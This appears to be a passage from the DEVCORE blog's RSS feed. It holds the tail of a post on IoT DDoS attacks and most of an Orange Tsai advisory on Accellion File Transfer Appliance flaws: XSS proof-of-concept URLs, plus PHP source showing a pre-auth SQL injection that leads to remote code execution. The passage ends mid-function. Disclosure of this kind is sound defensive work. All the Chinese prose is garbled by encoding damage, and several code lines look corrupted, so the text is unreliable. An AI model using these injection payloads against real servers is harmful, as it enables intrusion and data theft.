ˆç›¤é»é¢¨éšªçš„æ‰€åœ¨ï¼Œé€éäººå·¥æ»²é€æ¸¬è©¦æ¨¡æ“¬æ”»æ“Šè€…çš„æ”»æ“Šæ€ç¶­åŠè·¯å¾‘ï¼Œå¦‚åŒè»äº‹æ¼”ç¿’ä¸€èˆ¬ï¼Œå°‡å…¥ä¾µçš„é€”å¾‘ä¸€ä¸€å°é–ã€‚æˆ‘å€‘èªç‚º IoT ç­‰åµŒå…¥å¼è£ç½®ã€æ™ºæ…§å®¶é›»ã€ç”šè‡³ç¶²é€šè³‡å®‰è¨­å‚™æœ¬èº«ï¼Œæœªä¾†éƒ½æœƒæ˜¯é§­å®¢çµ„ç¹”æ”»æ“Šçš„å°è±¡ï¼Œåˆ©ç”¨æ›´æ–°çš„å›°é›£åº¦è·Ÿç®¡ç†è€…çš„ç–æ–¼ç®¡ç†ï¼Œå»ºç½®ä¸€å€‹å€‹å¤§è¦æ¨¡æ®­å±å¤§è»ï¼Œæˆç‚ºæœªä¾†æˆ°çˆ­çš„æ£‹å­ã€‚æˆ‘å€‘æœŸè¨±æœªä¾†å» å•†å»ºæ§‹ç”¢å“æ™‚ï¼Œéƒ½èƒ½å„ªå…ˆç´å…¥è³‡å®‰è€ƒé‡ï¼Œä¸æˆç‚ºé»‘è‰²ç”¢æ¥­çš„å¹«å‡¶ï¼Œä¹Ÿè®“åœ‹éš›èªå¯å°ç£ç”¢å“æ˜¯è³‡å®‰è‡³ä¸Šçš„å„ªè‰¯å“è³ªã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/</link>
                <guid>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks</guid>
                <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Accellion File Transfer Appliance å¼±é»å ±å‘Š</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt; &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;accellion-fta-ä»‹ç´¹&quot;&gt;Accellion FTA ä»‹ç´¹&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Accellion File Transfer Appliance (ä»¥ä¸‹ç°¡ç¨± FTA) ç‚ºä¸€æ¬¾å®‰å…¨æª”æ¡ˆå‚³è¼¸æœå‹™ï¼Œå¯è®“ä½¿ç”¨è€…ç·šä¸Šåˆ†äº«ã€åŒæ­¥æª”æ¡ˆï¼Œä¸”æ‰€æœ‰æª”æ¡ˆçš†ç¶“ AES 128/256 åŠ å¯†ï¼ŒEnterprise ç‰ˆæœ¬æ›´æ”¯æ´ SSL VPN æœå‹™ä¸¦æ•´åˆ AD, LDAP, Kerberos ç­‰ Single Sign-on æ©Ÿåˆ¶ã€‚
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;æ¼æ´æè¿°&quot;&gt;æ¼æ´æè¿°&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
åœ¨ç ”ç©¶éç¨‹ä¸­ï¼Œæ–¼ FTA ç‰ˆæœ¬ FTA_9_12_0 (13-Oct-2015 Release) ä¸Šï¼Œç™¼ç¾äº†ä¸‹åˆ—å¼±é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä»¥ä¸Šå¼±é»å¯ä½¿ä¸éœ€ç¶“éèªè­‰çš„æ”»æ“Šè€…ï¼ŒæˆåŠŸé ç«¯æ”»æ“Š FTA ä¼ºæœå™¨ä¸¦å–å¾—æœ€é«˜æ¬Šé™ï¼Œç•¶æ”»æ“Šè€…å®Œå…¨æ§åˆ¶ä¼ºæœå™¨å¾Œï¼Œå¯å–å¾—ä¼ºæœå™¨ä¸Šçš„åŠ å¯†æª”æ¡ˆèˆ‡ç”¨æˆ¶è³‡æ–™ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;å¼±é»ç¶“å›å ± CERT/CC å¾Œå–å¾—å…±å››å€‹ç¨ç«‹ CVE ç·¨è™Ÿ (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)ã€‚
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å½±éŸ¿ç¯„åœ&quot;&gt;å½±éŸ¿ç¯„åœ&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
æ ¹æ“šå…¬é–‹è³‡æ–™æƒæï¼Œå…¨çƒå…±ç™¼ç¾ 1217 å° FTA å­˜æ´»ä¸»æ©Ÿï¼Œä¸»è¦åˆ†å¸ƒåœ°é»ç‚ºç¾åœ‹ï¼Œå…¶æ¬¡åŠ æ‹¿å¤§ã€æ¾³æ´²ã€è‹±åœ‹èˆ‡æ–°åŠ å¡ã€‚æ ¹æ“šå­˜æ´»ä¸»æ©Ÿçš„åŸŸåã€SSL Certificate ç™¼ç¾ FTA ä½¿ç”¨å®¢æˆ¶éåŠæ”¿åºœã€æ•™è‚²ã€ä¼æ¥­ç­‰é ˜åŸŸï¼Œå…¶ä¸­ä¸ä¹ä¸€äº›çŸ¥åå“ç‰Œã€‚
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;æ¼æ´åˆ†æèˆ‡åˆ©ç”¨&quot;&gt;æ¼æ´åˆ†æèˆ‡åˆ©ç”¨&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;
?f2=â€™-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;
?documentname=â€onerror=â€prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;
?msg=ssologout&lt;br /&gt;
&amp;amp;loginurl=â€&amp;gt;&amp;lt;svg/onload=â€prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;ç¶“éä»£ç¢¼å¯©æŸ¥å¾Œï¼Œåœ¨ FTA ä¸­ç™¼ç¾ä¸€å€‹ä¸é ˆé©—è­‰çš„ SQL Injectionï¼Œé€™ä½¿å¾—æƒ¡æ„ä½¿ç”¨è€…å¯é€é SQL Injection å­˜å–ä¼ºæœå™¨çš„æ•æ„Ÿæª”æ¡ˆåŠå€‹äººè³‡æ–™ï¼Œä¸¦é…åˆæ¬Šé™è¨­å®šå•é¡Œå°è‡´é ç«¯ä»£ç¢¼åŸ·è¡Œã€‚å•é¡Œå‡ºåœ¨ security_key2.api ä¸­æ‰€å‘¼å«åˆ°çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; å‡½æ•¸ä¸­ï¼&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$password&lt;/code&gt; çš†ç‚ºæ”»æ“Šè€…å¯æ§åƒæ•¸ï¼Œé›–ç„¶æœ‰å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; å‡½æ•¸å°å¯†ç¢¼é€²è¡Œè™•ç†ï¼Œä½†æ˜¯èˆ‡å¼±é»è§¸ç™¼ä¸¦ç„¡ç›¸é—œã€‚å…¶ä¸­è¦æ³¨æ„æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; çš„å€¼æœƒè¢«ä»£å…¥æˆå…¨åŸŸè®Šæ•¸ï¼Œä»£è¡¨ç•¶å‰ä½¿ç”¨çš„ Application IDï¼Œä¸¦ä¸”åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; ä½¿ç”¨ï¼Œå…¶ä¸­åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; å…§æœ‰ä»¥ä¸‹ä»£ç¢¼ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt; ä¸­æ‰€é–‹å•Ÿè³‡æ–™åº«çš„åç¨±ç”±ä½¿ç”¨è€…å¯æ§ï¼Œå¦‚çµ¦éŒ¯èª¤çš„å€¼å°‡å°è‡´ç¨‹å¼ç„¡æ³•ç¹¼çºŒåŸ·è¡Œä¸‹å»ï¼Œæ‰€ä»¥å¿…é ˆå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; å½é€ æˆæ­£ç¢ºçš„å…§å®¹ã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—æ˜¯æœ€ä¸»è¦çš„å‡½æ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.* FROM t_mail_server &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_status&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec:mysql_query(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;) respond:&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id  != \&apos;999\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!(t_mail_server.c_flag &amp;amp; &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
